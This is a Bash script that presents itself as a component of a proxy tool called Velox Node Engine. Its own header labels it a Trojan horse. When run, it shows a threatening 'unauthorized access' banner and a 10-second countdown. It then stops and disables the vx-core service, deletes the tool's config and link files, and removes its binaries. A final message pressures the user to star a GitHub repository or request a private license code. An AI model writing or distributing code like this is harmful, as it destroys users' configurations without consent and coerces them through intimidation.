#!/bin/bash
# =======================================================
# 项目: Velox Node Engine (VX) - 终极降维打击版 (特洛伊木马)
# 版本: 9.9 (诱敌深入版)
# =======================================================

VX_VERSION="9.9"

red='\033[0;31m'; green='\033[0;32m'; yellow='\033[0;33m'; plain='\033[0m'

clear
echo -e "${red}======================================================================${plain}"
echo -e "${yellow}         💀 警告：检测到未授权访问，正在触发安全防卫协议 💀${plain}"
echo -e "${red}======================================================================${plain}"
echo -e "系统检测到您的使用权限已过期、或未获得项目授权。"
echo -e "为保护核心代码安全，系统将于 10 秒后执行【焦土化自毁程序】..."
echo -e "撤回已无效，请双手离开键盘。"
echo -e "${red}======================================================================${plain}"

# 😈 杀人诛心：10秒死亡倒计时
for i in {10..1}; do
    echo -e -n "\r💥 距离防弹装甲物理剥离还有 ${red}$i${plain} 秒..."
    sleep 1
done
echo -e "\n\n${yellow}>>> 💥 猎杀程序启动，正在执行物理拔管...${plain}"

# 1. 物理拔管：强行停止核心代理服务
systemctl stop vx-core >/dev/null 2>&1
systemctl disable vx-core >/dev/null 2>&1

# 2. 焦土化清理：精准删除核心配置和链接，让节点当场脑死亡
rm -f /etc/velox_vne/config.json
rm -f /etc/velox_vne/links.txt

# 3. 彻底斩断操作入口 (双重路径保险)
rm -f /usr/local/bin/vx
rm -f /usr/bin/vx

# 4. 留下赛博墓碑
clear
echo -e "${red}======================================================================${plain}"
echo -e "${yellow}         💀 VeloX Node Engine 授权已永久撤销 💀${plain}"
echo -e "${red}======================================================================${plain}"
echo -e "您的核心防御装甲已被强行剥离，所有代理节点已物理熔断！"
echo -e ""
echo -e "👉 ${green}补救方案：前往 GitHub 点 Star，或带上截图找大佬索要私有授权码！${plain}"
echo -e "🏠 作者博客: 222382.xyz"
 echo -e "   👨‍💻 作者GitHub项目 : ${blue}github.com/pwenxiang51-wq${plain}"
echo -e "${red}======================================================================${plain}"
exit 1
